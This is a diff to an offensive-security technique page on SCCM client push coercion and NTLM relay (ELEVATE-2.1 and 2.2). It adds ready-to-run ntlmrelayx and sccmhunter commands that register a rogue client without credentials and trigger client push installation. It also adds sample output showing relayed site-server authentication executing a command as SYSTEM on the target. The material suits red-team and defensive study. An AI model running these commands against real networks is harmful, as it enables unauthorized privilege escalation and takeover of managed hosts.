@@ -67,7 +67,7 @@ It is not possible to identify whether automatic site-wide client push installat
 1. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the relay target and the SMB service:
 
     ```
-    # impacket-ntlmrelayx -smb2support -ts -ip <NTLMRELAYX_LISTENER_IP> -t <RELAY_TARGET_IP>
+    # impacket-ntlmrelayx -smb2support -ts -ip <NTLMRELAYX_LISTENER_IP> -t smb://<RELAY_TARGET_IP> -c whoami
     Impacket v0.11.0 - Copyright 2023 Fortra
 
     <...SNIP...>
@@ -106,10 +106,37 @@ It is not possible to identify whether automatic site-wide client push installat
     ```
     **Note**: Sometimes, this command results in a client device record being created, but SCCM does not kick off automatic client push installation right away. Running the same command again should kick off the process.
 
+    (Linux) Use `sccmhunter`'s `http` module (by [Garrett Foster](https://x.com/unsigned_sh0rt)) to achieve the same result without a Windows host. The `--sccm-push` flag registers a client with the management point and sends a discovery data record (DDR) to trigger client push installation; `--sccm-push-anonymous` performs the registration without credentials. The feature was added in [PR #93](https://github.com/garrettfoster13/sccmhunter/pull/93).
+
+    The released version can report a successful registration while ConfigMgr silently discards the DDR. [garrettfoster13/sccmhunter#132](https://github.com/garrettfoster13/sccmhunter/pull/132) fixes the registration and DDR framing; use a build from that PR until it's merged upstream:
+
+    ```
+    python3 sccmhunter.py http \
+        -mp <MANAGEMENT_POINT> \
+        -dc-ip <DC_IP> \
+        -d <DOMAIN> \
+        -sleep 10 \
+        --sccm-push \
+        --sccm-push-cn <NTLMRELAYX_LISTENER_IP> \
+        --sccm-push-anonymous
+
+    SCCMHunter v2.0.0 by @unsigned_sh0rt
+    [21:54:38] INFO     [*] Performing SCCM client push attack
+    [21:54:38] INFO     [*] trying unauthenticated registration
+    [21:54:54] INFO     [+] Client <NTLMRELAYX_LISTENER_IP> registered with UUID: <SMS_CLIENT_GUID>
+    [21:54:54] INFO     [*] Waiting 10 seconds for database to update.
+    [21:55:04] INFO     [+] Sending DDR from GUID:<SMS_CLIENT_GUID>
+    [21:55:04] INFO     [+] Changing platformID to Microsoft Windows NT Workstation 2010.0, should trigger client push
+    ```
+
+    The management point may process the DDR just after the client-push component's discovery scan. If a device record appears but no connection follows, run the command once more; the next registration wakes the scan and commonly queues the preceding record.
+
 3. After a few minutes, ntlmrelayx should receive a connection from the configured client push installation account(s) and the site server’s machine account:
     ```
-    [2024-02-26 16:19:47] [*] SMBD-Thread-5 (process_request_thread): Received connection from <SITE_SERVER>, attacking target smb://<RELAY_TARGET>
-    [2024-02-26 16:19:48] [*] Authenticating against smb://<RELAY_TARGET> as MAYYHEM/CLIENTPUSH SUCCEED
+    [2026-08-28 22:01:57] [*] (SMB): Received connection from <SITE_SERVER>, attacking target smb://<RELAY_TARGET>
+    [2026-08-28 22:01:57] [*] (SMB): Authenticating connection from <DOMAIN>/<SITE_SERVER>$@<SITE_SERVER> against smb://<RELAY_TARGET> SUCCEED [1]
+    [2026-08-28 22:01:57] [*] smb://<DOMAIN>/<SITE_SERVER>$@<RELAY_TARGET> [1] -> Executed specified command on host: <RELAY_TARGET>
+    nt authority\system
     ```
     
 ### ELEVATE-2.2
@@ -168,6 +195,19 @@ It is not possible to identify whether automatic site-wide client push installat
     [+] Completed execution in 00:00:16.1952455
     ```
     **Note**: Sometimes, this command results in a client device record being created, but SCCM does not kick off automatic client push installation right away. Running the same command again should kick off the process.
+
+    (Linux) Use `sccmhunter`'s `http` module to the same effect, registering the client under the DNS name added in the previous step. This is the same registration and DDR flow shown in ELEVATE-2.1; only `--sccm-push-cn` changes, from the listener IP to the relay DNS name. As in ELEVATE-2.1, use a build from [garrettfoster13/sccmhunter#132](https://github.com/garrettfoster13/sccmhunter/pull/132) until it's merged upstream, and run the command again if the device record appears but the client-push connection does not start immediately:
+
+    ```
+    python3 sccmhunter.py http \
+        -mp <MANAGEMENT_POINT> \
+        -dc-ip <DOMAIN_CONTROLLER_IP> \
+        -d <DOMAIN> \
+        -sleep 10 \
+        --sccm-push \
+        --sccm-push-cn RELAY-SERVER \
+        --sccm-push-anonymous
+    ```
 
 4. After a few minutes, ntlmrelayx should receive a connection from the configured client push installation account(s) and relay that connection to the LDAP target:
     ```
@@ -233,3 +273,5 @@ SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>
 - Chris Thompson, [Coercing NTLM Authentication from SCCM Servers](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)
 - Chris Thompson, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
 - Logan Goins, [Wait, Why is my WebClient Started?: SCCM Hierarchy Takeover via NTLM Relay to LDAP](https://specterops.io/blog/2026/01/14/wait-why-is-my-webclient-started-sccm-hierarchy-takeover-via-ntlm-relay-to-ldap/)
+- Garrett Foster, [sccmhunter](https://github.com/garrettfoster13/sccmhunter)
+- MrFey, [add 'SCCM client push' feature](https://github.com/garrettfoster13/sccmhunter/pull/93)
